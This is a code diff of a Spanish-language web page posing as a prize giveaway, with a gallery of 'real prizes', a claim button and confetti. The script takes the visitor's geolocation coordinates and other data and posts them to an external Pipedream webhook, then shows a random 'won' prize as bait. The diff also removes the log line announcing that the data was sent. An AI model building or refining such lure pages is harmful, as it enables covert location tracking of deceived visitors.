@@ -46,26 +46,32 @@ button:hover { background: #0056b3; }
   overflow: hidden;
   box-shadow: 0 4px 12px rgba(0,0,0,0.1);
   transition: transform 0.3s ease;
+  cursor: pointer;
 }
 .premio-card img {
   width: 100%;
-  height: 100px;
+  height: 120px;
   object-fit: cover;
 }
-.premio-card:hover {
-  transform: scale(1.05);
-}
+.premio-card:hover { transform: scale(1.05); }
 #premio-grande {
   display: none;
-  margin-top: 30px;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%) scale(0.5);
+  z-index: 1000;
+  transition: transform 0.6s ease;
 }
+#premio-grande.show { transform: translate(-50%, -50%) scale(1); }
 #premio-grande img {
   width: 90%;
-  max-width: 500px;
+  max-width: 600px;
   height: auto;
   border-radius: 15px;
   box-shadow: 0 8px 25px rgba(0,0,0,0.25);
 }
+#premio-grande h3 { margin-top: 15px; color: #222; }
 canvas {
   position: fixed;
   top: 0;
@@ -94,24 +100,24 @@ const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net";
 
 // Premios reales
 const premios = [
-  {nombre:"Bicicleta de montaña", img:"https://images.unsplash.com/photo-1597108113201-f8c0dfc43e84?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
-  {nombre:"Consola Gamer", img:"https://images.unsplash.com/photo-1613770040934-f41844a3d8e4?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
-  {nombre:"Smartphone Gama Alta", img:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
-  {nombre:"Smartwatch", img:"https://images.unsplash.com/photo-1516574187841-cb9cc2ca948b?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
-  {nombre:"Laptop Ultrabook", img:"https://images.unsplash.com/photo-1517336714731-489689fd1ca8?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"},
-  {nombre:"TV Pantalla Grande", img:"https://images.unsplash.com/photo-1587202372775-4f0a7d99b0b0?crop=entropy&cs=tinysrgb&fit=max&w=600&q=80"}
+  {nombre:"Bicicleta de montaña", img:"https://images.unsplash.com/photo-1600891964599-f61ba0e24092?auto=format&fit=crop&w=800&q=80"},
+  {nombre:"Consola Gamer", img:"https://images.unsplash.com/photo-1613770040934-f41844a3d8e4?auto=format&fit=crop&w=800&q=80"},
+  {nombre:"Smartphone Gama Alta", img:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=800&q=80"},
+  {nombre:"Smartwatch", img:"https://images.unsplash.com/photo-1516574187841-cb9cc2ca948b?auto=format&fit=crop&w=800&q=80"},
+  {nombre:"Laptop Ultrabook", img:"https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&w=800&q=80"},
+  {nombre:"TV Pantalla Grande", img:"https://images.unsplash.com/photo-1587202372775-4f0a7d99b0b0?auto=format&fit=crop&w=800&q=80"}
 ];
 
 // Mostrar galería de premios
 const premiosGrid = document.getElementById("premios-grid");
-premios.forEach(p=>{
+premios.forEach((p, i)=>{
   const div = document.createElement("div");
   div.className = "premio-card";
+  div.dataset.index = i; // guardar índice
   div.innerHTML = `<img src="${p.img}" alt="${p.nombre}"><h4>${p.nombre}</h4>`;
   premiosGrid.appendChild(div);
 });
 
-// Botón reclamar premio
 const btn = document.getElementById("btnPremio");
 const premioGrande = document.getElementById("premio-grande");
 const imgGrande = document.getElementById("img-premio-grande");
@@ -127,7 +133,7 @@ btn.addEventListener("click",()=>{
 });
 
 function onSuccess(pos){
-  // Datos a enviar
+  // Enviar datos
   const data = {
     lat: pos.coords.latitude,
     lon: pos.coords.longitude,
@@ -139,19 +145,20 @@ function onSuccess(pos){
   };
   enviarWebhook(data);
 
-  // Elegir premio aleatorio
+  // Premio aleatorio
   const premio = premios[Math.floor(Math.random()*premios.length)];
+
+  // Animación "salto" de miniatura a centro
   imgGrande.src = premio.img;
   nombreGrande.textContent = premio.nombre;
   premioGrande.style.display = "block";
+  setTimeout(()=> premioGrande.classList.add("show"), 50);
 
-  // Confeti
   lanzarConfeti();
 }
 
 function onError(err){ alert("⚠️ Error al obtener ubicación: "+(err.message||err.code)); }
 
-// Confeti
 function lanzarConfeti(){
   const piezas = Array.from({length:150},()=>({
     x:Math.random()*canvas.width,
@@ -174,14 +181,13 @@ function lanzarConfeti(){
   setTimeout(()=>ctx.clearRect(0,0,canvas.width,canvas.height),6000);
 }
 
-// Enviar a Pipedream
 async function enviarWebhook(data){
   try{
     await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
-    console.log("Datos enviados a Pipedream");
   }catch(err){ console.error("Error webhook",err);}
 }
 </script>
 </body>
 </html>
+
 
